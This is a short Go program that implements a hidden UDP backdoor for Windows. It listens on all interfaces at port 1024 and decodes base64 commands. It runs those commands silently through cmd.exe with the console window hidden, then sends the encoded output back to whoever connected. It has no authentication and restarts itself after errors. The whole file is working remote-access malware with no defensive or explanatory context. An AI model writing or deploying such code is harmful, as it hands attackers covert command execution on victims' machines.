package main

import (
	b64 "encoding/base64"
	"fmt"
	"net"
	"os/exec"
	"syscall"
)

func check(err error) {
	if err != nil {
		panic(err)
	}
}

var encode_base64 = func(data []byte) string {
	return b64.StdEncoding.EncodeToString(data)
}

var decode_base64 = func(data string) []byte {
	decoded, err := b64.StdEncoding.DecodeString(data)
	check(err)
	return decoded
}

func receive(conn *net.UDPConn) (string, *net.UDPAddr) {
	buffer := make([]byte, 2048)
	n, remoteAddress, err := conn.ReadFromUDP(buffer)
	check(err)
	message := decode_base64(string(buffer[:n]))
	return string(message), remoteAddress
}

func response(conn *net.UDPConn, address *net.UDPAddr, data string) {
	_, err := conn.WriteToUDP([]byte(encode_base64([]byte(data))), address)
	check(err)
}

func process(command string) string {
	cmd := exec.Command("C:\\Windows\\system32\\cmd.exe", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	return fmt.Sprintf("stdout: %s \nstderr: %v", string(out), err)
}

func ListenAndServe(port int, address string, protocol string) {
	defer func() {
		if r := recover(); r != nil {
			ListenAndServe(port, address, protocol)
		}
	}()
	udp_address := net.UDPAddr{
		Port: port,
		IP:   net.ParseIP(address),
	}
	conn, err := net.ListenUDP(protocol, &udp_address)
	check(err)
	defer conn.Close()
	for {
		message, remoteAddress := receive(conn)
		output := process(message)
		go response(conn, remoteAddress, output)
	}
}

func main() {
	done := make(chan bool)
	go ListenAndServe(1024, "0.0.0.0", "udp")
	<-done
}
